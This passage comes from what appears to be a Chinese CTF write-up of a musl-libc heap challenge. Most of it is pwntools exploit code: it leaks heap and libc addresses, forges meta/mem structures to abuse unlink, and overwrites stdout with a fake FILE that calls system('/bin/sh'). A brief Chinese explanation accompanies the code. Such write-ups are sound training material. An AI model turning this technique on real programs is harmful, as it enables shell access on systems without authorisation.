class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">store(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">store(find_key(), <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">store(<span class="string">b&#x27;A\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>, <span class="number">0x1200</span>)</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">res = codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">mmap_base = u64(res[:<span class="number">8</span>]) - <span class="number">0x20</span></span><br><span class="line">chunk_addr = u64(res[<span class="number">8</span>:<span class="number">0x10</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(chunk_addr - <span class="number">0x60</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">heap_base = u64(codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>]) - <span class="number">0x1d0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(heap_base + <span class="number">0xf0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x200</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">libc.address = u64(codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>]) - <span class="number">0xb7040</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\0&#x27;</span>))) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>] == <span class="string">b&#x27;/bin/sh\0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(heap_base) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">secret = u64(codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;mmap base: %#x&#x27;</span> % mmap_base)</span><br><span class="line">log.info(<span class="string">&#x27;chunk address: %#x&#x27;</span> % chunk_addr)</span><br><span class="line">log.info(<span class="string">&#x27;heap base: %#x&#x27;</span> % heap_base)</span><br><span class="line">log.info(<span class="string">&#x27;libc base: %#x&#x27;</span> % libc.address)</span><br><span class="line">log.info(<span class="string">&#x27;secret: %#x&#x27;</span> % secret)</span><br><span class="line"></span><br><span class="line">fake_meta_addr = mmap_base + <span class="number">0x2010</span></span><br><span class="line">fake_mem_addr = mmap_base + <span class="number">0x2040</span></span><br><span class="line">stdout = libc.address + <span class="number">0xb4280</span>  </span><br><span class="line">log.info(<span class="string">&#x27;fake_meta_addr: %#x&#x27;</span> % fake_meta_addr)</span><br><span class="line">log.info(<span class="string">&#x27;fake_mem_addr: %#x&#x27;</span> % fake_mem_addr)</span><br><span class="line">log.info(<span class="string">&#x27;stdout: %#x&#x27;</span> % stdout)</span><br></pre></td></tr></table></figure><p>泄露出地址后，即可通过伪造<code>meta_area、meta、mem</code>来利用<code>unlink</code>，实现任意地址写，此时即可在<code>stdout</code>中写入<code>fake file</code>然后<code>getshell</code><br>即<code>2</code>次<code>free</code>掉自己伪造的<code>group</code>来实现任意地址分配<br>嘶，好像有点说不清，跟着<code>exp</code>一步一步调试即可知道详细原理<code>QWQ</code>，<code>unlink</code>的和<code>fsop</code>的原理上面有讲过(晚点补，如果有机会的话)<br>其实我感觉<code>meta</code>的伪造好像可以当成模板来使用？</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&#x27;./libc.so&#x27;</span>,<span class="string">&#x27;./pwn&#x27;</span>])</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">key_content, value_content, key_size=<span class="literal">None</span>, value_size=<span class="literal">None</span>, wait=<span class="literal">True</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        key_size = <span class="built_in">len</span>(key_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(key_size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>, key_content)</span><br><span class="line">    <span class="keyword">if</span> value_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        value_size = <span class="built_in">len</span>(value_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(value_size))</span><br><span class="line">    <span class="keyword">if</span> wait:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">    p.send(value_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>(<span class="params">key_content, key_size=<span class="literal">None</span>, wait=<span class="literal">True</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        key_size = <span class="built_in">len</span>(key_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(key_size))</span><br><span class="line">    <span class="keyword">if</span> wait:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">    p.send(key_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">key_content, key_size=<span class="literal">None</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        key_size = <span class="built_in">len</span>(key_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(key_size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>, key_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hash</span>(<span class="params">content</span>):</span><br><span class="line">    x = <span class="number">0x7e5</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> content:</span><br><span class="line">        x = <span class="built_in">ord</span>(c) + x * <span class="number">0x13377331</span></span><br><span class="line">    <span class="keyword">return</span> x &amp; <span class="number">0xfff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_key</span>(<span class="params">length=<span class="number">0x10</span>, h=<span class="number">0x7e5</span></span>):  <span class="comment"># 默认为\n对应的hash</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = <span class="string">&#x27;&#x27;</span>.join(random.choice(string.ascii_letters + string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br><span class="line">        <span class="keyword">if</span> get_hash(x) == h:</span><br><span class="line">            <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">store(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">store(find_key(), <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">store(<span class="string">b&#x27;A\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>, <span class="number">0x1200</span>)</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">res = codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">mmap_base = u64(res[:<span class="number">8</span>]) - <span class="number">0x20</span></span><br><span class="line">chunk_addr = u64(res[<span class="number">8</span>:<span class="number">0x10</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(chunk_addr - <span class="number">0x60</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">heap_base = u64(codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>]) - <span class="number">0x1d0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(heap_base + <span class="number">0xf0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x200</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">libc.address = u64(codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>]) - <span class="number">0xb7040</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\0&#x27;</span>))) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>] == <span class="string">b&#x27;/bin/sh\0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(heap_base) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">secret = u64(codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;mmap base: %#x&#x27;</span> % mmap_base)</span><br><span class="line">log.info(<span class="string">&#x27;chunk address: %#x&#x27;</span> % chunk_addr)</span><br><span class="line">log.info(<span class="string">&#x27;heap base: %#x&#x27;</span> % heap_base)</span><br><span class="line">log.info(<span class="string">&#x27;libc base: %#x&#x27;</span> % libc.address)</span><br><span class="line">log.info(<span class="string">&#x27;secret: %#x&#x27;</span> % secret)</span><br><span class="line"></span><br><span class="line">fake_meta_addr = mmap_base + <span class="number">0x2010</span></span><br><span class="line">fake_mem_addr = mmap_base + <span class="number">0x2040</span></span><br><span class="line">stdout = libc.address + <span class="number">0xb4280</span>  </span><br><span class="line">log.info(<span class="string">&#x27;fake_meta_addr: %#x&#x27;</span> % fake_meta_addr)</span><br><span class="line">log.info(<span class="string">&#x27;fake_mem_addr: %#x&#x27;</span> % fake_mem_addr)</span><br><span class="line">log.info(<span class="string">&#x27;stdout: %#x&#x27;</span> % stdout)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过dequeue的unlink在stdout-0x10 的地方写入fake_meta_addr</span></span><br><span class="line">sc = <span class="number">8</span> <span class="comment"># 0x90</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">last_idx = <span class="number">0</span></span><br><span class="line">maplen = <span class="number">1</span></span><br><span class="line">fake_meta = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(stdout - <span class="number">0x18</span>) <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(fake_meta_addr + <span class="number">0x30</span>) <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(fake_mem_addr) <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0</span>) + p32(<span class="number">0</span>) <span class="comment"># avail_mask, freed_mask</span></span><br><span class="line">fake_meta += p64((maplen &lt;&lt; <span class="number">12</span>) | (sc &lt;&lt; <span class="number">6</span>) | (freeable &lt;&lt; <span class="number">5</span>) | last_idx)</span><br><span class="line">fake_meta += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_mem = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_mem += p64(fake_meta_addr) <span class="comment"># meta</span></span><br><span class="line">fake_mem += p32(<span class="number">1</span>) <span class="comment"># active_idx</span></span><br><span class="line">fake_mem += p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0xaa0</span></span><br><span class="line">payload += p64(secret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += fake_meta</span><br><span class="line">payload += fake_mem</span><br><span class="line">payload += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(payload, <span class="number">0x1200</span>)</span><br><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, p64(<span class="number">0</span>) + p64(fake_mem_addr + <span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">delete(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将该fake meta进入active队列</span></span><br><span class="line">sc = <span class="number">8</span> <span class="comment"># 0x90</span></span><br><span class="line">last_idx = <span class="number">1</span></span><br><span class="line">fake_meta = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(<span class="number">0</span>) <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(<span class="number">0</span>) <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(fake_mem_addr) <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0</span>) + p32(<span class="number">0</span>) <span class="comment"># avail_mask, freed_mask</span></span><br><span class="line">fake_meta += p64((sc &lt;&lt; <span class="number">6</span>) | last_idx)</span><br><span class="line">fake_meta += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_mem = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_mem += p64(fake_meta_addr) <span class="comment"># meta</span></span><br><span class="line">fake_mem += p32(<span class="number">1</span>) <span class="comment"># active_idx</span></span><br><span class="line">fake_mem += p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0xa90</span></span><br><span class="line">payload += p64(secret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += fake_meta</span><br><span class="line">payload += fake_mem</span><br><span class="line">payload += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(payload, <span class="number">0x1200</span>)</span><br><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, p64(<span class="number">0</span>) + p64(fake_mem_addr + <span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">delete(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改meta的mem区域指向stdout-0x10</span></span><br><span class="line">fake_meta = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(fake_meta_addr) <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(fake_meta_addr) <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(stdout - <span class="number">0x10</span>) <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">1</span>) + p32(<span class="number">0</span>) <span class="comment"># avail_mask, freed_mask</span></span><br><span class="line">fake_meta += p64((sc &lt;&lt; <span class="number">6</span>) | last_idx)</span><br><span class="line">fake_meta += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x18</span></span><br><span class="line">fake_meta += p64(stdout - <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0xa80</span></span><br><span class="line">payload += p64(secret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += fake_meta</span><br><span class="line">payload += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">query(payload, <span class="number">0x1200</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入fake file</span></span><br><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">b&quot;/bin/sh&quot;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x80</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, fake_file, value_size=<span class="number">0x80</span>, wait=<span 